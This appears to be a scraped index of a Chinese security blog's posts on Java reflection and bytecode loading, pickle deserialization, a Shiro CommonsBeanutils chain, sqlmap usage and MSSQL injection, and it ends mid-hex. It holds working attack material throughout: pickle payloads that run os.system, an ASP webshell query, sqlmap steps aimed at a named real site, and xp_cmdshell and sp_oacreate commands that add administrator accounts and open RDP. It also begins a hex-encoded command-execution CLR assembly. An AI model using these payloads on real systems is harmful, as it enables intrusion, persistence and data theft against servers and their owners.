返回类或接口声明的所有办法，包括public、protected、private、和默认方法，但不包括继承的方法 import java.lang.reflect.Method;public class getfunction { public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;java.lang.Runtime&quot;); Method[] declaredMethods=name.getDeclaredMethods(); System.out.println(&quot;通过getDeclaredMethods获取的方法有:&quot;); for(Method m:declaredMethods) System.out.println(m); } 2.getMethods方法getMethods方法返回某个类的所有public方法，包括其继承类的public方法 public static void main(String[] args) throws ClassNotFoundException{ Class name= Class.forName(&quot;java.lang.Runtime&quot;); Method[] declaredMethods=name.getMethods(); System.out.println(&quot;通过getMethods获取的方法有:&quot;); for(Method m:declaredMethods) System.out.println(m);} 3.getMethod方法只能返回一个特定的方法，如Runtime类中的exec方法，该方法的第一个参数为方法名称，后面的参数为方法的参数对应class的对象 public static void main(String[] args) throws ClassNotFoundException,NoSuchMethodException{ Runtime rt=Runtime.getRuntime(); Class&lt;?&gt; name= rt.getClass(); Method method=name.getMethod(&quot;exec&quot;,String.class); System.out.println(&quot;通过getMethods获取的方法有:&quot;); System.out.println(method);} 4.getDeclaredMethod方法getDeclaredMethod方法和getMethod类似 获取成员变量1.getDeclaredFields方法getDeclaredFields能获得类的成员变量数组，包括public、private、protected，但是不包括父类的声明字段 2.getFields方法getFields能够获得某个类的所有public字段，包括父类中的字段， 3.getDeclaredField方法只能获得类的单个成员变量 4.getField方法类似getFields方法，能够获得某个类特定的public字段，包括父类中的字段 Class&lt;?&gt; name=student.getClass()Field getField=name.getField(&quot;content&quot;); 小结forName不是获取“类”的唯⼀途径，通常来说我们有如下三种⽅式获取⼀个“类”，也就是java.lang.Class对象： obj.getClass() 如果上下⽂中存在某个类的实例obj，那么我们可以直接通过obj.getClass()来获取它的类Test.class 如果你已经加载了某个类，只是想获取到它的java.lang.Class对象，那么就直接拿它的class属性即可。这个⽅法其实不属于反射。Class.forName 如果你知道某个类的名字，想获取到这个类，就可以使⽤forName来获取","link":"/2022/02/21/java%E5%AE%A1%E8%AE%A13/"},{"title":"java字节码","text":"##字节码能够恢复成一个类并在jvm中加载的字节序列##利用URLClassLoader加载远程class文件ClassLoader是java的类加载器，告诉java虚拟机如何加载这个类，默认根据类名加载类，并且这个类名是类完整路径，例如java.lang.Runtime###URLClassLoader正常情况下，java会根据sun.boot.class.path和java.class.path中列举的基础路径（这些路径是经过处理后的java.net.URl类）来寻找.class文件进行加载,基础路径有三种情况 URL未以斜杠 / 结尾，则认为是一个JAR文件，使用 JarLoader 来寻找类，即为在Jar包中寻找.class文件 URL以斜杠 / 结尾，且协议名是 file ，则使用 FileLoader 来寻找类，即为在本地文件系统中寻找.class文件 URL以斜杠 / 结尾，且协议名不是 file ，则使用最基础的 Loader 来寻找类###defineClass在加载远程class文件、本地class或者jar包时，java都经历了其中 loadClass 的作用是从已加载的类缓存、父加载器等位置寻找类（这里实际上是双亲委派机制），在前面没有找到的情况下，执行 findClass findClass 的作用是根据基础URL指定的方式来加载类的字节码，就像上一节中说到的，可能会在本地文件系统、jar包或远程http服务器上读取字节码，然后交给defineClass defineClass 的作用是处理前面传入的字节码，将其处理成真正的Java类###defineClass加载字节码####使用反射进行加载Method defineclass = ClassLoader.class.getDeclaredMethod(&quot;defineClass&quot;,String.class,byte[].class,int.class,int.class);defineClass,setAccessible(true);byte[] code= Base64.getDecoder().decode(&quot;&quot;);Class hello = (Class) defineclass.invoke(ClassLoader.getSystemClassLoader(),&quot;hello&quot;,code,0,code.length);hello.newInstance(); ####利用TemplatesImpl加载字节码com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl这个类中定义了一个内部类TransletClassLoader ：重写了defineClass方法，并且没有显式地声明其定义域。如果没有显式声明，则其作用域为default，可以被类外部调用，而TransletClassLoader#defineClass()向前追溯调用链以后可以发现，其最前面的两个方法为法 TemplatesImpl#getOutputProperties() 、 TemplatesImpl#newTransformer()#####使用newTransformer()构造pocbyte[] code=Base64.getDecoder().decode(&quot;&quot;);TemplatesImpl obj = new TemplatesImpl();setFieldValue(obj,&quot;_bytecodes&quot;,new byte[][]{code});setFieldValue(obj,&quot;_name&quot;,&quot;HelloTemplatesImpl&quot;);setFieldValue(obj,&quot;_tfactory&quot;,new TransformerFactoryImpl);obj.newTransformer(); 其中：setFieldValue 方法用来设置私有属性，可见，这里我设置了三个属性： _bytecodes 、 _name 和 _tfactory 。_bytecodes 是由字节码组成的数组； _name 可以是任意字符串，只要不为null即可；_tfactory 需要是一个 TransformerFactoryImpl 对象，因为TemplatesImpl#defineTransletClasses() 方法里有调用到_tfactory.getExternalExtensionsMap() ，如果是null会出错。另外，值得注意的是， TemplatesImpl 中对加载的字节码是有一定要求的：这个字节码对应的类必须是 com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet 的子类。因此在构造这个类的时候要写extends","link":"/2022/09/14/java%E6%89%A7%E8%A1%8C%E5%AD%97%E8%8A%82%E7%A0%81/"},{"title":"php中opcache特性利用","text":"","link":"/2022/08/18/php%E4%B8%ADopcache%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/"},{"title":"pickle反序列化","text":"##pickle反序列化语法###可序列化的对象 None,True,False 整数、浮点数、复数 str、byte、bytearray 只包含可封存的对象的集合，包括tuple、list、set、dict 定义在模块最外层的函数（使用def定义，lambda函数则不可以） 定义在模块最外层的内置函数 定义在模块最外层的类 __dict__属性值或__getstate__()函数的返回值可以被序列化的类###object.__reduce__()函数 object.__reduce__()返回一个(callable,([para1,para2....])[,...])的元组，在unpickle时，就会将callable作为函数并执行para1参数 在下文pickle的opcode中，R的作用与object.__reduce__()关系密切，选择栈上的第一个对象作为函数、第二个对象作为参数（第二个对象必须为元组），然后调用该函数。包含该函数的对象被pickle序列化时，得到的字符串是包含R的 ###opcode版本 pickle有不同的实现版本，在py2和py3中得到的opcode不同，但是pickle可以向下兼容。目前，pickle有6种版本import picklea={'1':1,'2':2}print(f'# 原变量：{a!r}')for i in range(4): print(f'pickle版本{i}',pickle.dumps(a,protocol=i)) 输出：# 原变量：{'1': 1, '2': 2}pickle版本0 b'(dp0\\nV1\\np1\\nI1\\nsV2\\np2\\nI2\\ns.'pickle版本1 b'}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickle版本2 b'\\x80\\x02}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.'pickle版本3 b'\\x80\\x03}q\\x00(X\\x01\\x00\\x00\\x001q\\x01K\\x01X\\x01\\x00\\x00\\x002q\\x02K\\x02u.' 以上为不同版本的opcode形式###pickletools通过pickletools可以将opcode转化为容易读取的形式###如何使用手写opcode####使用pickle序列化编写简单的exp#####成功命令执行import pickleimport osclass testpoc(object): def __reduce__(self): s=&quot;whoami&quot; return os.system,(s,)exp= testpoc()poc=pickle.dumps(exp)print(poc)pickle.loads(poc) 值得注意的是这里的返回值，需要满足reduce的使用方式，第一次参数为执行的函数，第二参数需要为元组，里面的内容为执行的参数#####实现变量覆盖import picklekey1 = b'321'key2 = b'123'class A(object): def __reduce__(self): return (exec,(&quot;key1=b'1'\\nkey2=b'2'&quot;,))a = A()pickle_a = pickle.dumps(a)print(pickle_a)pickle.loads(pickle_a)print(key1, key2) 这里有必要熟悉一下exec这个函数exec:exec obj.exec 执行储存在字符串或文件中的Python语句，相比于 eval，exec可以执行更复杂的 Python 代码。####手写opcode#####pickle过程详细解读 1.pickle依靠pvm进行，涉及解析引擎、栈、内存2.解析引擎从流中读取opcode和参数，并对齐进行解释，遇到.的时候停止，最终留在栈定的值会被作为反序列化对象返回3.memo：由python的dict实现，将反序列化完成的数据以key-value的形式存储在memo中#####opcode操作集合具体的就看这里的表格：https://xz.aliyun.com/t/7436编写时需要注意 了解栈中数据的变化，正确使用opcode 与python本身的操作对照，比如append对应a，exten对应e c操作符会尝试import库，所以在pickle.loads时不需要漏洞代码中先引入系统库。 pickle不支持列表索引、字典索引、点号取对象属性作为左值，需要索引时只能先获取相应的函数（如getattr、dict.get）才能进行。但是因为存在s、u、b操作符，作为右值是可以的。即“查值不行，赋值可以”。pickle能够索引查值的操作只有c、i。而如何查值也是CTF的一个重要考点。 s、u、b操作符可以构造并赋值原来没有的属性、键值对。以上为粘贴复制内容，还不太理解～ 拼接opcode：将第一个pickle流结尾表示结束的.去掉 import opcodeimport secretimport pickleimport pickletoolsopcode=b&quot;&quot;&quot;c__main__secret(S'name'S'1'db.&quot;&quot;&quot;print('be:',secret.name)output=pickle.loads(opcode)print('output:',pickletools.dis(opcode))print('af:',secret.name) 这里来解析一下这个opcode1.c__main__\\nsecret\\n：使用c操作符，引入当前main模块，并且获取secret对象2.S:实例化一个字符串对象3.(：向栈中压入一个MARK标记4.d：寻找栈中的上一个MARK，并组合之间的数据为字典（因此必须要偶数个，呈key-value对）5.b:使用栈中的第一个元素（存储属性值也有属性名的字典），对第二个元素进行属性设置#####与函数执行相关的opcode：R、i、oR: poc=b&quot;&quot;&quot;cossystem(S'whoami'tR.&quot;&quot;&quot; c引入os模块，获取其system函数，mark标记whoami参数，使用t操作符将whoami转化为元组，因为r操作符的对象是元组i:i操作符相当于c和o的组合，先获取一个全局函数，然后寻找栈中的上一个MARK，并组合之间的数据为元组，以该元组为参数执行全局函数（或实例化一个对象）具体写法：i[module]\\n[callable]\\n poc=b'''(S'whoami'iossystem.'''print(pickletools.dis(poc))output=pickle.loads(poc) 跟着这个打印结果，可以解析一下：组合了whoami为一个元组作为获取到的system这个函数的参数o:寻找栈中的上一个MARK，以之间的第一个数据（必须为函数）为callable，第二个到第n个数据为参数，执行该函数（或实例化一个对象） poc=b'''(cossystemS'whoami'o.'''print(pickletools.dis(poc))output=pickle.loads(poc) ##实战###pker工具使用部分语法： 以下module都可以是包含`.`的子module调用函数时，注意传入的参数类型要和示例一致对应的opcode会被生成，但并不与pker代码相互等价GLOBAL对应opcode：b'c'获取module下的一个全局对象（没有import的也可以，比如下面的os）：GLOBAL('os', 'system')输入：module,instance(callable、module都是instance) INST对应opcode：b'i'建立并入栈一个对象（可以执行一个函数）：INST('os', 'system', 'ls') 输入：module,callable,para OBJ对应opcode：b'o'建立并入栈一个对象（传入的第一个参数为callable，可以执行一个函数））：OBJ(GLOBAL('os', 'system'), 'ls') 输入：callable,paraxxx(xx,...)对应opcode：b'R'使用参数xx调用函数xxx（先将函数入栈，再将参数入栈并调用）li[0]=321或globals_dic['local_var']='hello'对应opcode：b's'更新列表或字典的某项的值xx.attr=123对应opcode：b'b'对xx对象进行属性设置return对应opcode：b'0'出栈（作为pickle.loads函数的返回值）：return xxx # 注意，一次只能返回一个对象或不返回对象（就算用逗号隔开，最后也只返回一个元组） ####2022美团ctf复现 a = base64.b64decode(session.get('ser_data')).replace(b&quot;builtin&quot;, b&quot;BuIltIn&quot;).replace(b&quot;os&quot;, b&quot;Os&quot;).replace(b&quot;bytes&quot;, b&quot;Bytes&quot;)if b'R' in a or b'i' in a or b'o' in a or b'b' in a: raise pickle.UnpicklingError(&quot;R i o b is forbidden&quot;)pickle.loads(base64.b64decode(session.get('ser_data'))) 前面就是session的伪造操作，关键的pickle反序列化代码在这个位置可以看到，他将builtin和os等内容都过滤了，并且将我们需要的Roib字符也过滤了，首先从代码逻辑层面研究他会将os替换为Os,此时如果最后的操作符输入，而在pickle中，有一个点很关键就是，opcode在执行过程中，遇到语法错误就会停止执行，但是在之前入过语法是正确的，则会照常执行这其实很符合python的风格，python也是一直执行直到出现语法错误为止。payload： poc=b&quot;&quot;&quot;(cossystemS'whoami'os.&quot;&quot;&quot; 可以看到，即使最后跑出了error，但是依旧执行命令了#####解法二这种解法更考察对pickle反序列化的理解了https://chowdera.com/2022/263/202209200043416482.html","link":"/2022/11/20/pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"shiro反序列化漏洞","text":"##漏洞分析首先我们看到其加密的key是一个固定值有了这个key我们就可以伪造 ##利用shiro打cc3.2.1首先我们知道，如果直接用invokeTransformer打的话是打不通的，因为在shiro里面，如果使用数组进行反序列化会报错，所以我们需要构造一条不用数组的——cc2，但是cc2后半段是用于cc4.0版本的，所以后半段我们需要替换一下，这里我用的是cc6的后半段首先，前面部分就是cc2的内容，不依赖于数组的传参方式，然后后面的部分使用的是cc6的链条，因为其无数版本，所以比较合适一些 ##利用shiro无依赖利用链由于shiro本身是不带cc的依赖，所以我们使用他自身带的依赖——commons-beanutils：这个是用来方便调用javaBean的，在使用这个cb进行调用的时候，使用以下格式的话，会在template这个对象里面，调用getOutputProperties方法 PropertyUtils.getProperty(template,&quot;outputProperties&quot;); 接下来我们就分析一下这个利用链：首先我们确定一下终点，依旧是templates的getOutputProperties方法，因为这个时候就会调用newTransformer方法接下来我们就找找哪里有使用PropertyUtils.getProperty方法，可以发现BeanComparator.compare中调用了这个方法，并且参数是可控的，说到compare，其实就很熟悉了，在cc4中中，我们就有用过了，这里直接粘贴过来构造一下链子其中需要改的地方，首先是增加调用BeanComparator然后就是后面对PriorityQueue的赋值操作， //BeanComparator中的属性properties需要设置一下，就是我们需要调用的属性 BeanComparator beanComparator = new BeanComparator(&quot;outputProperties&quot;);//为了防止在序列化的过程直接执行，然后报错断掉，这里我们需要先弄一个其他的对象替代一下，最后再用反射改值 TransformingComparator transformingComparator = new TransformingComparator(new ConstantTransformer(1)); PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);//这里的add就和前面的cc4没啥区别了 priorityQueue.add(template); priorityQueue.add(2);//最后这里用反射改值就行 Class p = priorityQueue.getClass(); Field priorityQueuecon = p.getDeclaredField(&quot;comparator&quot;); priorityQueuecon.setAccessible(true); priorityQueuecon.set(priorityQueue,beanComparator); 但是这里有几个坑，如果没有cc依赖的话，这里的BeanComparator需要这么写才行，因为默认的comparator是需要有cc依赖的使用ysoserial打的时候，要注意版本，yso的cb版本是1.9.2","link":"/2023/01/15/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"},{"title":"sqlmap指令","text":"##access数据库+sqlmap指令###get类型注入1.检测是否存在注入点：'、and 1=1、and 1=2、2.使用sqlmap进行检测注入点是否可用 sqlmap.py -u url 3.完整的access+sqlmap注入指令 一个完整的access注入过程命令（1）注入点判断：sqlmap.py-u http://www.antian365.com/index.asp?id=1（2）猜数据库表:sqlmap.py -u http://www.antian365.com/index.asp?id=1 –tables输入线程：10，回车后开始跑表，找到合适的表后，按下ctrl+c终止跑表。（3）对某个表进行字段猜解sqlmap.py-u ” http://www.antian365.com/index.asp?id=1” –tables –columns -Tadmin例如获取admin表的字段如下： id,username,password（4）对admin表字段内容进行猜解sqlmap.py -u &quot; http://www.antian365.com/index.asp?id=1&quot;--dump -T admin -C &quot;username,password&quot; （5）获取明文密码或者加密密码。通过cmd5.com等在线网站进行明文密码破解。（6）寻找后台地址，并登录后台（7）通过后台管理寻求可以获取webshell的功能模块，尝试获取webshell。知道web真实路径，且可以通过脚本执行查询，则可以通过查询来获取webshell，例如网站真实路径：d:\\freehost\\fred200903\\web\\，则查询语句为：SELECT '&lt;%execute request(&quot;a&quot;)%&gt;' into [a] in ' d:\\freehost\\fred200903\\web\\x.asp;a.xls''excel 8.0;' from aShell地址：http://www.somesite.com/ x.asp;a.xls，一句话后门密码a。 ###POST类型注入： 1.Accesspost登录框注入注入点：http://xxx.xxx.com/Login.asp（1）通过burpsurte抓包保存为txt文件，使用sqlmap进行自动注入例如对着注入点使用burp抓包，保存tg .txt文件，使用命令：./sqlmap.py-r tg.txt -p tfUPass（2）自动搜索表单的方式 sqlmap-u http://xxx.xxx.com/Login.asp –forms（3）指定一个参数的方法sqlmap-u http://xxx.xxx.com/Login.asp --data &quot;tfUName=1&amp;tfUPass=1&quot;2.Cookie注入sqlmap -u &quot;http://www.xxx.com/news.asp&quot;--cookie &quot;id=1&quot; --table --level 2 1.sqlmap -r test.txt判断是否存在注入点，test.txt中对注入点记得加个*号来做一下标记2.","link":"/2022/05/01/sqlmap%E6%8C%87%E4%BB%A4/"},{"title":"sql_server注入","text":"##mssql注入SQL Server的端口号是1433，数据库后缀名是.mdf，注释符是–。延时命令：WAITFOR DELAY '0:0:2'###SQLServer有三个权限级别 sa权限：数据库操作、文件管理、命令执行、注册表读取等system。是最高权限 db权限：文件管理、数据库操作等权限 public权限：数据库操作guest-users ###判断当前用户权限 判断是否为SA权限select is_srvrolemember('sysadmin')判断是否为db_owner权限select is_member('db_owner')判断是否为public权限select is_srvrolemember() master数据库：master数据库控制SQL Server的所有方面。这个数据库中包括所有的配置信息、用户登录信息、当前正在服务器中运行的过程的信息。 model数据库： model数据库是建立所有用户数据库时的模板。当你建立一个新数据库时，SQL Server会把model数据库中的所有对象建立一份拷贝并移到新数据库中。在模板对象被拷贝到新的用户数据库中之后，该数据库的所有多余空间都将被空页填满。 msdb数据库：msdb数据库是SQL Server中的一个特例。如果你查看这个数据库的实际定义，会发现它其实是一个用户数据库。不同之处是SQL Server拿这个数据库来做什么。所有的任务调度、报警、操作员都存储在msdb数据库中。该库的另一个功能是用来存储所有备份历史。SQL Server Agent将会使用这个库。 tempdb数据库：tempdb数据库是一个非常特殊的数据库，供所有来访问你的SQL Server的用户使用。这个库用来保存所有的临时表、存储过程和其他SQL Server建立的临时用的东西。例如，排序时要用到tempdb数据库。数据被放进tempdb数据库，排完序后再把结果返回给用户。每次SQL Server重新启动，它都会清空tempdb数据库并重建。永远不要在tempdb数据库建立需要永久保存的表。###SQL Server数据库的查询语句 select @@version; #查询数据库的版本select @@servername; #查询服务名select host_name(); #查询主机名，如果是用navicat远程连接的话，主机名是本地的名字select db_name(); #查询当前数据库名select db_name(1); #查询第一个数据库名select db_name(2); #查询第二个数据库名select user; #查询当前数据库的拥有者，结果为 dbo。dbo是每个数据库的默认用户，具有所有者权限，全称：datebaseOwner ，即DbOwner use tempdb #切换到tempdb表 top n #查询前n条记录limit 2,3 #查询第2条开始的3条数据，也就是2,3,4select substring('string',2,1) #截取给定字符串的索引为2的1个字符select ascii('a') #查询给定字符串的ascii值select len('string') #查询给定字符串的长度EXEC sp_spaceused @updateusage = N'TRUE'; #查询当前数据库的大小sp_spaceused '表名' #查询指定表名的大小EXEC master.sys.xp_dirtree '\\\\192.168.106.5\\xx.txt',0,1; 判断是否是SA权限select is_srvrolemember('sysadmin') 判断是否是db_owner权限 select is_member('db_owner')判断是否是public权限select is_srvrolemember('public') #数据库的连接server=127.0.0.1;UID=sa;PWD=123456;database=master;Provider=SQLOLEDBmssql://sa:123456@127.0.0.1/XCCMS_SocialBusinessDB count(name)是查询总数name是查询名字*是查询详细信息 #查询数据库select count(name) from sysdatabases #查询数据库的个数,只有当前数据库是master的时候，才能执行该命令select name from sysdatabases #查询数据库的名字select * from sysdatabases #查询所有数据库的信息 #查询数据表select count(name) from sysobjects where type='U' #查询当前数据库中表的个数select name from sysobjects where type='U' #查询当前数据库中所有表的名字select * from sysobjects where type='U' #查询当前数据库的所有表的详细信息 select count(name) from test..sysobjects where xtype='U' #查询指定test数据库中表的个数select name from test..sysobjects where xtype='U' #查询指定test数据库中表的名字select * from test..sysobjects where xtype='U' #查询指定test数据库中表的详细信息 #查询列select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询当前数据库的指定users表的列的个数select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询当前数据库的指定users表的所有列的名字select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询当前数据库的指定users表的列的详细信息 select count(name) from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询指定test数据库的指定users表的列的个数select name from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询指定test数据库的指定users表的所有列的名字select * from test..syscolumns where id=(select max(id) from test..sysobjects where xtype='u' and name='users') #查询指定test数据库的指定users表的列的详细信息 #查询数据select count(*) from test..users #查询test数据库user表的数据的条数select * from test..users #查询test数据库user表的所有数据 ###SA权限开启xp_cmdshell获取主机权限判断xp_cmdshell是否打开，1就是打开，0就是关闭 select count(*) FROM master..sysobjects Where xtype = 'X' AND name = 'xp_cmdshell' 如果xp_cmdshell权限没开启的话，可以执行下面命令开启 execute('sp_configure &quot;show advanced options&quot;,1') #将该选项的值设置为1execute('reconfigure') #保存设置execute('sp_configure &quot;xp_cmdshell&quot;, 1') #将xp_cmdshell的值设置为1execute('reconfigure') #保存设置execute('sp_configure') #查看配置execute('xp_cmdshell &quot;whoami&quot;') #执行系统命令 或者exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; exec sp_configure; exec xp_cmdshell 'whoami'; 可以执行系统权限之后,前提是获取的主机权限是administrators组里的exec xp_cmdshell 'net user Guest 123456' #给guest用户设置密码exec xp_cmdshell 'net user Guest /active:yes' #激活guest用户exec xp_cmdshell 'net localgroup administrators Guest /add' #将guest用户添加到administrators用户组exec xp_cmdshell 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f' #开启3389端口 ###SA权限使用sp_oacreate执行系统命令 使用sp_oacreate提权前提条件： SQLServer数据库服务未降权（因为需要调用COM组件） 1.查看是否可以利用sp_oacreate执行系统命令 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'whoami' 如果SQLServer阻止了对组件‘Ole Automation Procedures’ 的过程 ‘sys.sp_OACreate’ 的访问，可以使用下面的命令打开 EXEC sp_configure 'show advanced options', 1; RECONFIGURE WITH OVERRIDE; EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE WITH OVERRIDE; 可以执行命令，但是sp_oacreate执行系统命令不回显可以使用指令创建用户 declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'c:\\windows\\system32\\cmd.exe /c net user hack Password@ /add' **注:**创建用户以后可以使用mstsc，进行远程桌面连接上述命令实现的是创建了一个用用户名为hack，密码为Password@的###SA权限使用CLR执行系统命令 #启用MSSQL CLR功能exec sp_configure 'show advanced options', 1;RECONFIGURE;Exec sp_configure 'clr enabled', 1;RECONFIGURE; #为了导入了不安全的程序集，我们还需要将数据库标记为安全。ALTER DATABASE [master] SET TRUSTWORTHY ON; #导入程序集，单独执行CREATE ASSEMBLY [WarSQLKit] AUTHORIZATION [dbo] FROM 0x4d5a90000300000004000000ffff0000b800000000000000400000000000000000000000000000000000000000000000000000000000000000000000800000000e1fba0e00b409cd21b8014ccd21546869732070726f6772616d2063616e6e6f742062652072756e20696e20444f53206d6f64652e0d0d0a2400000000000000504500004c0103006643f55f0000000000000000e00022200b013000000e00000006000000000000022d0000002000000040000000000010002000000002000004000000000000000400000000000000008000000002000000000000030040850000100000100000000010000010000000000000100000000000000000000000b02c00004f00000000400000b803000000000000000000000000000000000000006000000c00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000200000080000000000000000000000082000004800000000000000000000002e74657874000000080d000000200000000e000000020000000000000000000000000000200000602e72737263000000b8030000004000000004000000100000000000000000000000000000400000402e72656c6f6300000c0000000060000000020000001400000000000000000000000000004000004200000000000000000000000000000000e42c00000000000048000000020005005c220000540a00000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000be280e00000a72010000706f0f00000a280e00000a7243000070725300007002281000000a28020000066f0f00000a2a1b300600a40100000100001173040000060a731100000a0b076f1200000a026f1300000a03281400000a2d0c076f1200000a036f1500000a076f1200000a176f1600000a076f1200000a176f1700000a076f1200000a166f1800000a076f1200000a176f1900000a076f1200000a176f1a00000a06731b00000a7d010000040706fe0605000006731c00000a6f1d00000a140c076f1e00000a26076f1f00000a076f2000000a6f2100000a0c076f2200000ade390d280e00000a1b8d160000012516725d000070a2251702a2251803a225197291000070a2251a096f2300000aa2282400000a6f0f00000ade00076f2500000a2d1a280e00000a067b010000046f2600000a6f0f00000a3895000000731b00000a130408281400000a2d091104086f2700000a26067b010000046f2800000a2c20110472970000706f2700000a261104067b010000046f2600000a6f2700000a26280e00000a1c8d16000001251602a2251703a2251872af000070a22519076f2500000a13051205282900000aa2251a7291000070a2251b1104252d0426142b056f2600000aa2282400000a6f0f00000a067b010000046f2600000a2a011000000000870021a80039100000011e02282a00000a2a4e027b01000004046f2b00000a6f2700000a262a42534a4201000100000000000c00000076322e302e35303732370000000005006c00000038030000237e0000a4030000a804000023537472696e6773000000004c080000e80000002355530034090000100000002347554944000000440900001001000023426c6f620000000000000002000001571502000902000000fa013300160000010000001c000000030000000100000005000000050000002b0000000d000000010000000100000003000000010000000000b1020100000000000600ed01ae0306005a02ae03060038019b030f00ce03000006004c01cd020600d001cd020600b101cd0206004102cd0206000d02cd0206002602cd0206007901cd0206009401cd0206003004c6020a0063014e030e0009049b030600df02c602060020036e0406001d01ae030e00ee039b030a007a044e030a0015014e0306008e02c6020e00f7029b030e00c4009b030e0035039b0306000803360006001503360006002700c602000000002d00000000000100010001001000dd030000350001000100030110000100000035000100040006006404740050200000000096005e007800010080200000000096008b001a00020040220000000086189503060004004022000000008618950306000400482200000000830016007d000400000001007d0000000100e400000002001f04000001002e03000002000404090095030100110095030600190095030a00290095031000310095031000390095031000410095031000490095031000510095031000590095031000610095031000710095030600910095030600a1000c011500a90096001000b10029041a007900950306007900e9022d00b900d7001000b10098043200b90011041000b90085043700b900b4003c00b90078023700b9007b033700b90049043700890095030600c90095034200790066004800790043044e007900ed000600790069035200d900810057007900370406008100a8005700b10029045b0079009b00610069008c025700890001016500890095026100e1008c02570069009503060099004c005700200063000b012e000b0084002e0013008d002e001b00ac002e002300b5002e002b00cb002e003300cb002e003b00cb002e004300d1002e004b00e1002e005300cb002e005b00fe0063006b000b012000048000000100000000000000000000000000a00200000200000000000000000000006b005500000000000200000000000000000000006b004000000000000200000000000000000000006b00c60200000000030002000000003c3e635f5f446973706c6179436c617373315f30003c52756e436f6d6d616e643e625f5f3000496e743332003c4d6f64756c653e0053797374656d2e494f0053797374656d2e44617461006765745f44617461006d73636f726c696200436d6445786563006164645f4f757470757444617461526563656976656400636d640052656164546f456e640052756e436f6d6d616e640053656e64006765745f45786974436f6465006765745f4d657373616765007365745f57696e646f775374796c650050726f6365737357696e646f775374796c65007365745f46696c654e616d650066696c656e616d6500426567696e4f7574707574526561644c696e6500417070656e644c696e65006765745f506970650053716c5069706500436f6d70696c657247656e6572617465644174747269627574650044656275676761626c6541747472696275746500417373656d626c795469746c654174747269627574650053716c50726f63656475726541747472696275746500417373656d626c7954726164656d61726b41747472696275746500417373656d626c7946696c6556657273696f6e41747472696275746500417373656d626c79436f6e66696775726174696f6e41747472696275746500417373656d626c794465736372697074696f6e41747472696275746500436f6d70696c6174696f6e52656c61786174696f6e7341747472696275746500417373656d626c7950726f6475637441747472696275746500417373656d626c79436f7079726967687441747472696275746500417373656d626c79436f6d70616e794174747269627574650052756e74696d65436f6d7061746962696c697479417474726962757465007365745f5573655368656c6c4578656375746500546f537472696e67006765745f4c656e6774680057617253514c4b69744d696e696d616c0057617253514c4b69744d696e696d616c2e646c6c0053797374656d0053797374656d2e5265666c656374696f6e00457863657074696f6e006765745f5374617274496e666f0050726f636573735374617274496e666f0053747265616d526561646572005465787452656164657200537472696e674275696c6465720073656e646572004461746152656365697665644576656e7448616e646c6572004d6963726f736f66742e53716c5365727665722e536572766572006765745f5374616e646172644572726f72007365745f52656469726563745374616e646172644572726f72002e63746f720053797374656d2e446961676e6f73746963730053797374656d2e52756e74696d652e436f6d70696c6572536572766963657300446562756767696e674d6f6465730053746f72656450726f63656475726573004461746152656365697665644576656e744172677300617267730050726f63657373007365745f417267756d656e747300617267756d656e747300436f6e636174004f626a6563740057616974466f7245786974005374617274007365745f52656469726563745374616e646172644f7574707574007374644f75747075740053797374656d2e546578740053716c436f6e74657874007365745f4372656174654e6f57696e646f770049734e756c6c4f72456d707479000000004143006f006d006d0061006e0064002000690073002000720075006e006e0069006e0067002c00200070006c006500610073006500200077006100690074002e00000f63006d0064002e00650078006500000920002f006300200000334f00530020006500720072006f00720020007700680069006c006500200065007800650063007500740069006e006700200000053a002000001753007400640020006f00750074007000750074003a0000372000660069006e00690073006800650064002000770069007400680020006500780069007400200063006f006400650020003d0020000000c1b0e79eb8eb6348be1e0c1d83c2d05800042001010803200001052001011111042001010e04000012550500020e0e0e0c0706120c123d0e1241124508042000125d040001020e0420010102052001011161052002011c180520010112650320000204200012690320000e0500010e1d0e0320000805200112450e08b77a5c561934e08903061245040001010e062002011c124d0801000800000000001e01000100540216577261704e6f6e457863657074696f6e5468726f7773010801000200000000001501001057617253514c4b69744d696e696d616c00000501000000000f01000a457975702043454c494b00001c010017687474703a2f2f6579757063656c696b2e636f6d2e747200000c010007312e302e302e3000000401000000d82c00000000000000000000f22c0000002000000000000000000000000000000000000000000000e42c0000000000000000000000005f436f72446c6c4d61696e006d73636f7265652e646c6c0000000000ff25002000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001001000000018000080000000000000000000000000000001000100000030000080000000000000000000000000000001000000000048000000584000005c03000000000000000000005c0334000000560053005f00560045005200530049004f004e005f0049004e0046004f0000000000bd04effe00000100000001000000000000000100000000003f000000000000000400000002000000000000000000000000000000440000000100560061007200460069006c00650049006e0066006f00000000002400040000005400720061006e0073006c006100740069006f006e00000000000000b004bc0200000100530